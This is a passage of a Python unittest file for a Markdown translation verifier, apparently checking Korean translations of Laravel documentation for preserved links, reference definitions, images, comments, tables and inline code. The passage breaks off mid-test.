import unittest

from sync import response_contract, verify
from sync.common.markdown import reference_definitions


class ReferenceDefinitionParserTests(unittest.TestCase):
    def test_normalizes_commonmark_labels_and_preserves_definition_fields(self):
        definitions = reference_definitions(
            '[Cache \t DOC]: /docs/13.x/cache "Cache docs"\n'
        )

        self.assertEqual(len(definitions), 1)
        self.assertEqual(definitions[0].label, "cache doc")
        self.assertEqual(definitions[0].target, "/docs/13.x/cache")
        self.assertEqual(definitions[0].title, '"Cache docs"')

    def test_ignores_definitions_inside_fences_and_html_comments(self):
        text = """```md
[fenced]: /docs/12.x/cache "Fenced"
```

<!--
[commented]: /docs/12.x/cache "Commented"
-->

[visible]: /docs/13.x/cache "Visible"
"""

        self.assertEqual(
            [
                (definition.label, definition.target, definition.title)
                for definition in reference_definitions(text)
            ],
            [("visible", "/docs/13.x/cache", '"Visible"')],
        )

    def test_parses_container_and_multiline_commonmark_definitions(self):
        text = """> [quote]: /quote

- [list]: /list

   [multi]:
          /destination
               'the
               title'
"""

        self.assertEqual(
            [
                (definition.label, definition.target, definition.title)
                for definition in reference_definitions(text)
            ],
            [
                ("quote", "/quote", ""),
                ("list", "/list", ""),
                ("multi", "/destination", "'the\n               title'"),
            ],
        )

    def test_rejects_invalid_nested_and_overlong_reference_labels(self):
        text = (
            "[[Acquire lock]]: /safe\n\n"
            f"[{'a' * 1000}]: /too-long\n"
        )

        self.assertEqual(reference_definitions(text), ())

    def test_does_not_treat_a_definition_as_interrupting_a_paragraph(self):
        text = "Paragraph text.\n[ref]: /not-a-definition\n"

        self.assertEqual(reference_definitions(text), ())

    def test_applies_commonmark_block_boundaries_to_definitions(self):
        invalid = (
            "[r]:\n> /safe\n",
            "-     [r]: /safe\n",
            "paragraph\n2. [r]: /safe\n",
            "paragraph\n01. [r]: /safe\n",
            "#not heading\n[r]: /safe\n",
            "---not hr\n[r]: /safe\n",
            "<span>x</span>\n[r]: /safe\n",
            "<script>\n[r]: /safe\n</script>\n",
            "<script>\n\n[r]: /safe\n",
            "<script>\n> [r]: /safe\n</script>\n",
            "<!--\n\n[r]: /safe\n",
            "<?pi\n\n[r]: /safe\n?>\n",
            "<![CDATA[\n\n[r]: /safe\n]]>\n",
            "<!DOCTYPE html\n\n[r]: /safe\n>\n",
            "<div>\n# heading\n[r]: /safe\n",
            "<x-widget>\n# heading\n[r]: /safe\n",
        )

        for text in invalid:
            with self.subTest(text=text):
                self.assertEqual(reference_definitions(text), ())

        definitions = reference_definitions("> [r]:\n/safe\n")
        self.assertEqual(
            [(definition.label, definition.target) for definition in definitions],
            [("r", "/safe")],
        )

    def test_accepts_an_uncapped_multiline_reference_title(self):
        title_lines = [
            f"title line {number}: {'x' * 40}"
            for number in range(120)
        ]
        text = '[r]: /safe "\n' + "\n".join(title_lines) + '\n"\n'

        definitions = reference_definitions(text)

        self.assertEqual(len(definitions), 1)
        self.assertEqual(definitions[0].target, "/safe")
        self.assertGreater(len(definitions[0].title), 4096)

    def test_resumes_reference_parsing_after_a_blank_terminated_html_block(self):
        text = (
            "<div>\n"
            "[inside]: /hidden\n\n"
            "[visible]: /safe\n"
        )

        self.assertEqual(
            [
                (definition.label, definition.target)
                for definition in reference_definitions(text)
            ],
            [("visible", "/safe")],
        )

    def test_resumes_reference_parsing_after_raw_html_container_exit(self):
        cases = (
            (
                "> <div>\n"
                "# Heading\n"
                '[visible]: /safe "Visible"\n',
                [("visible", "/safe")],
            ),
            (
                "- <div>\n"
                "  [inside]: /hidden\n"
                "# Heading\n"
                '[visible]: /safe "Visible"\n',
                [("visible", "/safe")],
            ),
        )

        for text, expected in cases:
            with self.subTest(text=text):
                self.assertEqual(
                    [
                        (definition.label, definition.target)
                        for definition in reference_definitions(text)
                    ],
                    expected,
                )


class VerifyContentTests(unittest.TestCase):
    def test_accepts_preserved_reference_definition_as_structure(self):
        source = '[cache]: /docs/13.x/cache "Cache docs"\n'

        self.assertEqual(
            response_contract.verify(source, source, locale="ko"),
            [],
        )
        self.assertEqual(verify.verify(source, source=source), [])

    def test_accepts_container_and_multiline_reference_definitions(self):
        source = """> [quote]: /quote

- [list]: /list

[multi]:
  /destination
  "multi
  line"
"""

        self.assertEqual(
            response_contract.verify(source, source, locale="ko"),
            [],
        )
        self.assertEqual(verify.verify(source, source=source), [])

    def test_rejects_invalid_reference_looking_english_prose(self):
        source = "[[Acquire lock]]: /safe\n"

        self.assertIn(
            "provider untranslated source text",
            response_contract.verify(source, source, locale="ko"),
        )
        self.assertIn(
            "untranslated source text",
            verify.verify(source, source=source),
        )

    def test_rejects_reordered_duplicate_reference_definitions(self):
        source = (
            "See [Laravel][ref].\n\n"
            "[ref]: /cache\n\n"
            "[ref]: /routing\n"
        )
        translated = (
            "<!-- See [Laravel][ref]. -->\n"
            "[Laravel][ref] 문서를 참고합니다.\n\n"
            "[ref]: /routing\n\n"
            "[ref]: /cache\n"
        )

        self.assertIn(
            "provider link target mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )
        self.assertIn(
            "link target mismatch",
            verify.verify(translated, source=source),
        )

    def test_rejects_nbsp_reference_label_drift(self):
        source = (
            "See [Laravel][cache docs].\n\n"
            "[cache docs]: /cache\n"
        )
        translated = (
            "<!-- See [Laravel][cache docs]. -->\n"
            "[Laravel][cache docs] 문서를 참고합니다.\n\n"
            "[cache\u00a0docs]: /cache\n"
        )

        self.assertIn(
            "provider link label mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )
        self.assertIn(
            "link label mismatch",
            verify.verify(translated, source=source),
        )

    def test_rejects_reference_usage_resolved_to_another_definition(self):
        source = (
            "See [Laravel][cache].\n\n"
            "[cache]: /cache\n"
            "[routing]: /routing\n"
        )
        translated = (
            "<!-- See [Laravel][cache]. -->\n"
            "[Laravel][routing] 문서를 참고합니다.\n\n"
            "[cache]: /cache\n"
            "[routing]: /routing\n"
        )

        self.assertIn(
            "provider link target mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )
        self.assertIn(
            "link target mismatch",
            verify.verify(translated, source=source),
        )

    def test_accepts_equivalent_angle_reference_destination(self):
        source = "[ref]: <https://example.com/cache>\n"
        translated = "[ref]: https://example.com/cache\n"

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            [],
        )
        self.assertEqual(verify.verify(translated, source=source), [])

    def test_rejects_reference_target_route_class_drift(self):
        source = "[ref]: /docs/13.x/cache\n"
        translated = "[ref]: /cache\n"

        self.assertIn(
            "provider link target mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )
        self.assertIn(
            "link target mismatch",
            verify.verify(translated, source=source, version="13.x"),
        )

    def test_rejects_reference_drift_after_raw_html_container_exit(self):
        source = (
            "> <div>\n"
            "# Heading\n"
            '[ref]: /docs/13.x/cache "Cache docs"\n'
        )
        translated = (
            "> <div>\n"
            "<!-- # Heading -->\n"
            "# Heading\n"
            '[ref]: /docs/12.x/cache "Changed docs"\n'
        )

        self.assertIn(
            "provider link target mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )
        self.assertIn(
            "link target mismatch",
            verify.verify(translated, source=source),
        )

    def test_accepts_link_only_legacy_pipe_table(self):
        source = (
            "Name | Contract\n"
            "---- | --------\n"
            "[Cache](cache.md) | [Factory](factory.md)\n"
        )
        legacy_translation = (
            "<!-- Name | Contract ---- | -------- "
            "[Cache](cache.md) | [Factory](factory.md) -->\n"
            f"{source}"
        )
        fresh_translation = (
            "<!-- Name | Contract ---- | -------- "
            "[Cache](cache.md) | [Factory](factory.md) -->\n"
            "이름 | 계약\n"
            "---- | --------\n"
            "[Cache](cache.md) | [Factory](factory.md)\n"
        )

        self.assertEqual(
            response_contract.verify(fresh_translation, source, locale="ko"),
            [],
        )
        self.assertEqual(
            verify.verify(legacy_translation, source=source),
            [],
        )
        legacy_provider_issues = response_contract.verify(
            legacy_translation,
            source,
            locale="ko",
        )
        self.assertIn(
            "provider untranslated source text",
            legacy_provider_issues,
        )
        self.assertIn(
            "provider target language mismatch",
            legacy_provider_issues,
        )

    def test_accepts_preserved_version_and_date_legacy_table_cells(self):
        source = (
            "Name | Version | Date | Description\n"
            "---- | ------- | ---- | -----------\n"
            "Laravel | 13.x | 2026-01-01 | Stable release\n"
        )
        translated = (
            "<!-- Name | Version | Date | Description ---- | ------- | ---- "
            "| ----------- Laravel | 13.x | 2026-01-01 | Stable release -->\n"
            "이름 | 버전 | 날짜 | 설명\n"
            "---- | ------- | ---- | -----------\n"
            "Laravel | 13.x | 2026-01-01 | 안정 릴리스\n"
        )

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            [],
        )
        self.assertEqual(verify.verify(translated, source=source), [])

    def test_rejects_optional_quote_annotation_moved_to_later_quote(self):
        source = (
            "> First guidance.\n\n"
            "Middle paragraph.\n\n"
            "> Second guidance.\n"
        )
        translated = (
            "> 첫 번째 안내입니다.\n\n"
            "<!-- Middle paragraph. -->\n"
            "중간 문단입니다.\n\n"
            "> <!-- First guidance. -->\n"
            "> 두 번째 안내입니다.\n"
        )

        self.assertIn(
            "source comment mismatch",
            verify.verify(translated, source=source),
        )

    def test_rejects_changed_jsx_image_source_with_greater_than_expression(self):
        source = (
            '<img src={count > 0 ? "/a.png" : "/b.png"} '
            'alt="Source" />\n'
        )
        translated = (
            '<!-- <img src={count > 0 ? "/a.png" : "/b.png"} '
            'alt="Source" /> -->\n'
            '<img src="/evil.png" alt="번역" />\n'
        )

        self.assertIn(
            "html image source mismatch",
            verify.verify(translated, source=source),
        )

    def test_rejects_markdown_and_html_image_cross_format_reordering(self):
        source = (
            "![Cat](cat.png)\n\n"
            '<img src="dog.png" alt="Dog"/>\n'
        )
        translated = (
            '<!-- <img src="dog.png" alt="Dog"/> -->\n'
            '<img src="dog.png" alt="개"/>\n\n'
            "<!-- ![Cat](cat.png) -->\n"
            "![고양이](cat.png)\n"
        )

        self.assertIn(
            "link target mismatch",
            verify.verify(translated, source=source),
        )
        self.assertIn(
            "provider link target mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )

    def test_detects_empty_html_comments_outside_code(self):
        for text in ("<!-- -->\n", "<!--\n\t\n-->\n"):
            with self.subTest(text=text):
                self.assertIn("empty HTML comment", verify.verify(text))

    def test_accepts_a_preserved_empty_source_comment(self):
        source = "<!-- -->\n\nKeep this paragraph.\n"
        translated = (
            "<!-- -->\n\n"
            "<!-- Keep this paragraph. -->\n"
            "이 문단을 유지합니다.\n"
        )

        self.assertNotIn(
            "empty HTML comment",
            verify.verify(translated, source=source),
        )

    def test_detects_an_extra_empty_html_comment(self):
        source = "Keep this paragraph.\n"
        translated = (
            "<!-- -->\n"
            "<!-- Keep this paragraph. -->\n"
            "이 문단을 유지합니다.\n"
        )

        self.assertIn(
            "empty HTML comment",
            verify.verify(translated, source=source),
        )

    def test_rejects_a_relocated_empty_source_comment(self):
        source = "<!-- -->\n\nKeep this paragraph.\n"
        translated = (
            "<!-- Keep this paragraph. -->\n"
            "이 문단을 유지합니다.\n\n"
            "<!-- -->\n"
        )

        self.assertIn(
            "source comment mismatch",
            verify.verify(translated, source=source),
        )

    def test_detects_unclosed_html_comment_outside_code(self):
        self.assertIn(
            "malformed HTML comment",
            verify.verify("본문입니다.\n\n<!-- unfinished\n"),
        )

    def test_detects_stray_html_comment_closer_outside_code(self):
        self.assertIn(
            "malformed HTML comment",
            verify.verify("본문입니다. -->\n"),
        )

    def test_detects_comment_delimiters_crossed_by_inline_code(self):
        text = "<!-- begin ` --> <!-- unclosed `\n"

        self.assertIn("malformed HTML comment", verify.verify(text))

    def test_ignores_malformed_comment_tokens_inside_fenced_code(self):
        text = """```html
<!-- -->
<!-- unfinished
-->
```
"""

        self.assertNotIn("malformed HTML comment", verify.verify(text))

    def test_ignores_comment_tokens_in_markdown_literal_contexts(self):
        cases = (
            "~~~text <!--\nbody\n~~~\n",
            "    <!--\n",
            "---\ndescription: <!-- literal\n---\n",
        )

        for text in cases:
            with self.subTest(text=text):
                self.assertNotIn(
                    "malformed HTML comment",
                    verify.verify(text),
                )

    def test_accepts_a_preserved_multiline_source_comment(self):
        source = """<!--
keep line 1
keep line 2
-->

Acquire the cache lock.
"""
        translated = """<!--
keep line 1
keep line 2
-->

<!-- Acquire the cache lock. -->
캐시 잠금을 획득합니다.
"""

        self.assertEqual(verify.verify(translated, source=source), [])

    def test_accepts_annotation_with_structural_html_wrapper_lines(self):
        source = """<div>
<span>Visible text</span>
</div>
"""
        translated = """<!--
<div>
<span>Visible text</span>
</div>
-->
<div>
<span>표시 텍스트</span>
</div>
"""

        self.assertEqual(verify.verify(translated, source=source), [])

    def test_accepts_comment_for_a_source_structural_html_block(self):
        source = """<p align="center">
<img src="release.png"/>
</p>
"""
        translated = f"""<!--
{source}-->
{source}"""

        self.assertEqual(verify.verify(translated, source=source), [])

    def test_accepts_adjacent_legacy_image_comment_with_translated_alt(self):
        source = '<img src="diagram.png" alt="Source diagram"/>\n'
        translated = (
            '<!-- <img src="diagram.png" alt="Source diagram"/> -->\n'
            '<img src="diagram.png" alt="번역된 다이어그램" />\n'
        )

        self.assertEqual(verify.verify(translated, source=source), [])

    def test_rejects_relocated_source_anchor_annotation(self):
        source = '<a name="cache"></a>\n\nCache body.\n'
        translated = """<a name="cache"></a>

<!-- Cache body. -->
캐시 본문입니다.

<!-- <a name="cache"></a> -->
"""

        self.assertIn(
            "source comment mismatch",
            verify.verify(translated, source=source),
        )

    def test_rejects_relocated_multiline_structural_annotation(self):
        source = """<p align="center">
<img src="release.png"/>
</p>
"""
        translated = f"""{source}
<!--
{source}-->
"""

        self.assertIn(
            "source comment mismatch",
            verify.verify(translated, source=source),
        )

    def test_rejects_legacy_annotation_around_html_table_boundaries(self):
        source = """<table>
<tr><td><strong>Command</strong></td><td><code>php</code></td></tr>
<tr><td><strong>Args</strong></td><td><code>artisan boost:mcp</code></td></tr>
</table>
"""
        translated = """<!--
<table>
<tr><td><strong>Command</strong></td><td><code>php</code></td></tr>
<tr><td><strong>Args</strong></td><td><code>artisan boost:mcp</code></td></tr>
</table>
-->
<table>
<tr><td><strong>명령어</strong></td><td><code>php</code></td></tr>
<tr><td><strong>인수</strong></td><td><code>artisan boost:mcp</code></td></tr>
</table>
"""

        self.assertIn(
            "source comment mismatch",
            verify.verify(translated, source=source),
        )

    def test_rejects_relocated_duplicate_structural_annotations(self):
        source = "<div></div>\n\n<div></div>\n"
        translated = f"""{source}
<!-- <div></div> -->
<!-- <div></div> -->
"""

        self.assertIn(
            "source comment mismatch",
            verify.verify(translated, source=source),
        )

    def test_accepts_an_owned_optional_quote_annotation(self):
        source = "> Remember this guidance.\n"
        translated = """> <!-- > Remember this guidance. -->
> 이 안내를 기억하세요.
"""

        self.assertEqual(verify.verify(translated, source=source), [])

    def test_accepts_owned_quote_annotations_after_a_fenced_block(self):
        source = """```text
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

<a name="first"></a>

> [!NOTE]
> First guidance.

<a name="second"></a>

> [!NOTE]
> Second guidance.
"""
        translated = """```text
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

<a name="first"></a>

> [!NOTE]
> <!-- First guidance. -->
> 첫 번째 안내입니다.

<a name="second"></a>

> [!NOTE]
> <!-- Second guidance. -->
> 두 번째 안내입니다.
"""

        self.assertEqual(verify.verify(translated, source=source), [])

    def test_rejects_optional_quote_annotation_at_the_wrong_depth(self):
        source = "> Remember this guidance.\n"
        translated = """<!-- > Remember this guidance. -->
> > 이 안내를 기억하세요.
"""

        self.assertIn(
            "source comment mismatch",
            verify.verify(translated, source=source),
        )

    def test_rejects_table_annotation_with_a_different_column_shape(self):
        source = "| Name | Value |\n"
        translated = """<!-- | Name | Value | -->
| 이름 |
"""

        self.assertIn(
            "source comment mismatch",
            verify.verify(translated, source=source),
        )

    def test_rejects_table_annotation_moved_to_a_later_same_shape_table(self):
        source = """| First | Value |
| --- | --- |
| Alpha | One |

| Second | Value |
| --- | --- |
| Beta | Two |
"""
        translated = """| 첫째 | 값 |
| --- | --- |
| 알파 | 하나 |

<!-- | First | Value | -->
| 둘째 | 값 |
| --- | --- |
| 베타 | 둘 |
"""

        self.assertIn(
            "provider source comment mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )
        self.assertIn(
            "source comment mismatch",
            verify.verify(translated, source=source),
        )

    def test_detects_title_case_action_phrase_with_translated_suffix(self):
        source = "Delete All Records\n"
        translated = (
            "<!-- Delete All Records -->\n"
            "Delete All Records를 실행합니다.\n"
        )

        self.assertIn(
            "untranslated source text",
            verify.verify(translated, source=source),
        )

    def test_detects_prose_phrases_with_technical_prefixes(self):
        cases = (
            ("This Works", "This Works예요."),
            ("This Works.", "This Works예요."),
            ("API Requests Are Retried", "API Requests Are Retried를 사용합니다."),
            ("HTTP Requests Are Retried", "HTTP Requests Are Retried를 사용합니다."),
            ("Laravel Users Are Active", "Laravel Users Are Active를 사용합니다."),
            ("API Delete All Records", "API Delete All Records를 사용합니다."),
        )
        for source_body, translated_body in cases:
            with self.subTest(source=source_body):
                translated = (
                    f"<!-- {source_body} -->\n"
                    f"{translated_body}\n"
                )

                self.assertIn(
                    "untranslated source text",
                    verify.verify(translated, source=source_body + "\n"),
                )

    def test_detects_all_caps_prose_echoes(self):
        cases = (
            "API ERROR HANDLING AND RETRY GUIDE",
            "HTTP JSON API SQL PHP",
            "API Delete All Records",
        )
        for source_body in cases:
            with self.subTest(source=source_body):
                translated = (
                    f"<!-- {source_body} -->\n"
                    f"{source_body}\n"
                )

                self.assertIn(
                    "untranslated source text",
                    verify.verify(translated, source=source_body + "\n"),
                )

    def test_detects_untranslated_prose_in_a_legacy_pipe_table(self):
        source = (
            "Feature | Description\n"
            "------- | -------\n"
            "Lock | Prevent writes\n"
        )
        translated = (
            "<!-- Feature | Description ------- | ------- "
            "Lock | Prevent writes -->\n"
            f"{source}"
        )

        self.assertIn(
            "untranslated source text",
            verify.verify(translated, source=source),
        )

    def test_accepts_translated_prose_in_a_legacy_pipe_table(self):
        source = (
            "Feature | Description\n"
            "------- | -------\n"
            "Lock | Prevent writes\n"
        )
        translated = (
            "<!-- Feature | Description ------- | ------- "
            "Lock | Prevent writes -->\n"
            "기능 | 설명\n"
            "------- | -------\n"
            "잠금 | 쓰기 방지\n"
        )

        self.assertEqual(verify.verify(translated, source=source), [])

    def test_detects_partial_prose_echo_in_a_legacy_pipe_table(self):
        source = (
            "Feature | Description\n"
            "------- | -------\n"
            "Lock | Prevent writes\n"
        )
        translated = (
            "<!-- Feature | Description ------- | ------- "
            "Lock | Prevent writes -->\n"
            "기능 | 설명\n"
            "------- | -------\n"
            "Lock | Prevent writes를 차단합니다\n"
        )

        self.assertIn(
            "untranslated source text",
            verify.verify(translated, source=source),
        )

    def test_accepts_legacy_english_headers_with_translated_table_prose(self):
        source = (
            "Command | Description\n"
            "------- | -----------\n"
            "`valet start` | Start the Valet daemons.\n"
        )
        translated = (
            "<!-- Command | Description ------- | ----------- "
            "`valet start` | Start the Valet daemons. -->\n"
            "Command | Description\n"
            "------- | -----------\n"
            "`valet start` | Valet 데몬을 시작합니다.\n"
        )

        self.assertEqual(verify.verify(translated, source=source), [])

    def test_accepts_preserved_product_and_api_names(self):
        cases = ("Laravel Vapor", "OpenAI Responses API")
        for source_body in cases:
            with self.subTest(source=source_body):
                translated = (
                    f"<!-- {source_body} -->\n"
                    f"{source_body}를 사용합니다.\n"
                )

                self.assertEqual(
                    verify.verify(translated, source=source_body + "\n"),
                    [],
                )

    def test_accepts_preserved_indented_command(self):
        source = "    vagrant destroy\n"
        translated = (
            "<!--     vagrant destroy -->\n"
            "    vagrant destroy\n"
        )

        self.assertEqual(verify.verify(translated, source=source), [])

    def test_accepts_preserved_legacy_pipe_table(self):
        source = (
            "Facade | Class\n"
            "------- | -------\n"
            "App | `Application`\n"
        )
        translated = (
            "<!-- Facade | Class ------- | ------- App | `Application` -->\n"
            f"{source}"
        )

        self.assertEqual(verify.verify(translated, source=source), [])

    def test_accepts_preserved_inline_code_only_paragraph(self):
        source = "`Illuminate\\Database\\Grammar`\n"
        translated = (
            "<!-- `Illuminate\\Database\\Grammar` -->\n"
            "`Illuminate\\Database\\Grammar`\n"
        )

        self.assertEqual(verify.verify(translated, source=source), [])

    def test_accepts_mixed_bare_link_and_inline_code_identifier_list(self):
        source = "[assertCookie](#assert-cookie)\n`assertSimilarJson`\n[assertStatus](#assert-status)\n"
        translated = (
            "<!-- [assertCookie](#assert-cookie) `assertSimilarJson` "
            "[assertStatus](#assert-status) -->\n"
            f"{source}"
        )

        self.assertEqual(verify.verify(translated, source=source), [])

    def test_accepts_html_code_only_list_item_without_annotation(self):
        sources = (
            "- <code>decimal:&lt;precision&gt;</code>\n",
            "- `decimal:`<code>&lt;digits&gt;</code>\n",
        )

        for source in sources:
            with self.subTest(source=source):
                self.assertEqual(
                    verify.missing_original_comments(source, source),
                    [],
                )
                self.assertEqual(verify.verify(source, source=source), [])

    def test_accepts_preserved_emphasized_identifier_group(self):
        source = (
            "**whereDate / whereMonth / whereDay / whereYear / whereTime**\n"
        )
        translated = (
            "<!-- **whereDate / whereMonth / whereDay / whereYear / "
            "whereTime** -->\n"
            f"{source}"
        )

        self.assertEqual(verify.verify(translated, source=source), [])

    def test_accepts_preserved_environment_assignment(self):
        source = "PADDLE_SANDBOX=true\n"
        translated = (
            "<!-- PADDLE_SANDBOX=true -->\n"
            "PADDLE_SANDBOX=true\n"
        )

        self.assertEqual(verify.verify(translated, source=source), [])

    def test_ignores_heading_attribute_syntax_inside_html_comments(self):
        text = "<!--\n# Title {.class}\n-->\n"

        self.assertNotIn("title style class", verify.verify(text))

    def test_detects_link_url_changed_even_when_original_comment_contains_url(self):
        source = "See [Routing](routing.md#basic-routing)."
        translated = """<!-- See [Routing](routing.md#basic-routing). -->
[라우팅](routing.md#기본-라우팅)을 참고하세요.
"""

        self.assertIn("link target mismatch", verify.verify(translated, source=source))

    def test_detects_translated_link_text_even_when_url_is_preserved(self):
        source = "See [Routing](routing.md#basic-routing)."
        translated = """<!-- See [Routing](routing.md#basic-routing). -->
[라우팅](routing.md#basic-routing)을 참고하세요.
"""

        self.assertIn("link label mismatch", verify.verify(translated, source=source))

    def test_accepts_preserved_link_text_when_url_is_preserved(self):
        source = "See [Routing](routing.md#basic-routing)."
        translated = """<!-- See [Routing](routing.md#basic-routing). -->
[Routing](routing.md#basic-routing)을 참고하세요.
"""

        self.assertNotIn("link label mismatch", verify.verify(translated, source=source))

    def test_accepts_translated_image_alt_with_ordered_target_and_title(self):
        source = (
            'Show the cat image: ![Cat](cat.png "Cat title").\n\n'
            'Show the dog image: ![Dog](dog.png "Dog title").\n'
        )
        translated = (
            '<!-- Show the cat image: ![Cat](cat.png "Cat title"). -->\n'
            '고양이 이미지를 표시합니다: ![고양이](cat.png "Cat title").\n\n'
            '<!-- Show the dog image: ![Dog](dog.png "Dog title"). -->\n'
            '개 이미지를 표시합니다: ![개](dog.png "Dog title").\n'
        )

        self.assertEqual([], verify.verify(translated, source=source))

    def test_detects_markdown_image_target_and_title_drift(self):
        source = (
            'Show the cat image: ![Cat](cat.png "Cat title").\n\n'
            'Show the dog image: ![Dog](dog.png "Dog title").\n'
        )
        cases = (
            (
                "swapped targets",
                (
                    '<!-- Show the cat image: ![Cat](cat.png "Cat title"). -->\n'
                    '고양이 이미지를 표시합니다: '
                    '![고양이](dog.png "Cat title").\n\n'
                    '<!-- Show the dog image: ![Dog](dog.png "Dog title"). -->\n'
                    '개 이미지를 표시합니다: ![개](cat.png "Dog title").\n'
                ),
                "link target mismatch",
            ),
            (
                "missing image",
                (
                    '<!-- Show the cat image: ![Cat](cat.png "Cat title"). -->\n'
                    '고양이 이미지를 표시합니다: '
                    '![고양이](cat.png "Cat title").\n'
                ),
                "link target mismatch",
            ),
            (
                "changed target",
                (
                    '<!-- Show the cat image: ![Cat](cat.png "Cat title"). -->\n'
                    '고양이 이미지를 표시합니다: '
                    '![고양이](wrong.png "Cat title").\n\n'
                    '<!-- Show the dog image: ![Dog](dog.png "Dog title"). -->\n'
                    '개 이미지를 표시합니다: ![개](dog.png "Dog title").\n'
                ),
                "link target mismatch",
            ),
            (
                "swapped titles",
                (
                    '<!-- Show the cat image: ![Cat](cat.png "Cat title"). -->\n'
                    '고양이 이미지를 표시합니다: '
                    '![고양이](cat.png "Dog title").\n\n'
                    '<!-- Show the dog image: ![Dog](dog.png "Dog title"). -->\n'
                    '개 이미지를 표시합니다: ![개](dog.png "Cat title").\n'
                ),
                "link title mismatch",
            ),
            (
                "changed title",
                (
                    '<!-- Show the cat image: ![Cat](cat.png "Cat title"). -->\n'
                    '고양이 이미지를 표시합니다: '
                    '![고양이](cat.png "Wrong title").\n\n'
                    '<!-- Show the dog image: ![Dog](dog.png "Dog title"). -->\n'
                    '개 이미지를 표시합니다: ![개](dog.png "Dog title").\n'
                ),
                "link title mismatch",
            ),
        )

        for name, translated, expected_issue in cases:
            with self.subTest(name=name):
                self.assertIn(
                    expected_issue,
                    verify.verify(translated, source=source),
                )

    def test_ignores_backslash_escaped_link_syntax(self):
        source = "Literal \\[Docs](guide.md).\n"
        translated = """<!-- Literal \\[Docs](guide.md). -->
리터럴 \\[문서](other.md)입니다.
"""

        self.assertEqual(verify.verify(translated, source=source), [])

    def test_detects_unclosed_link_with_parentheses_in_destination(self):
        target = "https://en.wikipedia.org/wiki/Mode_(statistics)"
        source = f"See [Mode]({target})."
        translated = f"""<!-- See [Mode]({target}). -->
[Mode](https://en.wikipedia.org/wiki/Mode_(statistics)을 참고하세요.
"""

        self.assertIn("link target mismatch", verify.verify(translated, source=source))

    def test_detects_changed_target_with_non_double_quoted_link_title(self):
        cases = (
            ("'Read more'", "'Read more'"),
            ("(Read more)", "(Read more)"),
        )
        for source_title, translated_title in cases:
            with self.subTest(title=source_title):
                source = f"See [Docs](guide.md {source_title}).\n"
                translated = (
                    f"<!-- See [Docs](guide.md {source_title}). -->\n"
                    f"[문서](other.md {translated_title})를 참고하세요.\n"
                )
                self.assertIn(
                    "link target mismatch",
                    verify.verify(translated, source=source),
                )

    def test_detects_changed_link_title_when_target_is_preserved(self):
        source = 'See [Docs](guide.md "Read more").\n'
        translated = (
            '<!-- See [Docs](guide.md "Read more"). -->\n'
            '[Docs](guide.md "다음 읽기")를 참고하세요.\n'
        )

        self.assertIn(
            "link title mismatch",
            verify.verify(translated, source=source),
        )

    def test_detects_swapped_link_labels_and_targets(self):
        source = (
            "Generate a [redirect HTTP response](responses#redirects) "
            "for a [named route](routing#named-routes)."
        )
        translated = """<!-- Generate a [redirect HTTP response](responses#redirects) for a [named route](routing#named-routes). -->
[redirect HTTP response](routing#named-routes)에 대한 [named route](responses#redirects)을 생성합니다.
"""

        self.assertIn("link pair mismatch", verify.verify(translated, source=source))

    def test_accepts_normalized_reference_definition_label(self):
        source = '[Cache \t DOC]: /docs/13.x/cache "Cache docs"\n'
        translated = '[cache doc]: /docs/13.x/cache "Cache docs"\n'

        issues = verify.verify(translated, source=source, version="13.x")

        self.assertEqual(issues, [])

    def test_detects_reference_definition_version_drift(self):
        source = '[cache-doc]: /docs/13.x/cache "Cache docs"\n'
        translated = '[CACHE-DOC]: /docs/12.x/cache "Cache docs"\n'

        issues = verify.verify(translated, source=source, version="13.x")

        self.assertIn("link target mismatch", issues)
        self.assertIn("link pair mismatch", issues)
        self.assertNotIn("link label mismatch", issues)

    def test_detects_reference_definition_title_drift(self):
        source = '[cache-doc]: /docs/13.x/cache "Cache docs"\n'
        translated = '[cache-doc]: /docs/13.x/cache "다른 제목"\n'

        issues = verify.verify(translated, source=source, version="13.x")

        self.assertIn("link title mismatch", issues)
        self.assertNotIn("link target mismatch", issues)
        self.assertNotIn("link label mismatch", issues)
        self.assertNotIn("link pair mismatch", issues)

    def test_detects_missing_duplicate_reference_definition(self):
        definition = '[cache-doc]: /docs/13.x/cache "Cache docs"'
        source = f"{definition}\n\n{definition}\n"
        translated = f"{definition}\n"

        issues = verify.verify(translated, source=source, version="13.x")

        self.assertIn("link target mismatch", issues)
        self.assertIn("link label mismatch", issues)
        self.assertIn("link pair mismatch", issues)

    def test_detects_missing_inline_code_from_translated_body(self):
        source = "Set `user_id` before saving."
        translated = """<!-- Set `user_id` before saving. -->
저장하기 전에 사용자 ID를 설정합니다.
"""

        self.assertIn("inline code mismatch", verify.verify(translated, source=source))

    def test_ignores_backslash_escaped_backticks_as_inline_code(self):
        source = "Use \\`literal\\` text.\n"
        translated = """<!-- Use \\`literal\\` text. -->
번역된 \\`리터럴\\` 텍스트입니다.
"""

        self.assertEqual(verify.verify(translated, source=source), [])

    def test_detects_changed_multi_backtick_inline_code(self):
        source = "Use ``foo`bar`` now.\n"
        translated = "이제 ``foo`baz``를 사용합니다.\n"

        self.assertIn(
            "inline code mismatch",
            verify.verify(translated, source=source),
        )

    def test_detects_changed_multiline_inline_code(self):
        source = "Use `foo\nbar` now.\n"
        translated = "이제 `foo\nbaz`를 사용합니다.\n"

        self.assertIn(
            "inline code mismatch",
            verify.verify(translated, source=source),
        )

    def test_does_not_pair_backticks_across_a_paragraph_boundary(self):
        source = "Use the `using` method`:\n\nNext `sub` claim.\n"
        translated = """<!-- Use the `using` method`: -->
`using` 메서드를 사용합니다.

<!-- Next `sub` claim. -->
다음 `sub` 클레임입니다.
"""

        self.assertNotIn(
            "inline code mismatch",
            verify.verify(translated, source=source),
        )

    def test_detects_code_block_content_changed(self):
        source = """```js
// Create a user
const user = {};
```
"""
        translated = """```js
// 사용자를 생성합니다
const user = {};
```
"""

        self.assertIn("code block mismatch", verify.verify(translated, source=source))

    def test_detects_fence_that_consumes_the_document_tail(self):
        source = "Keep this text.\n"
        translated = (
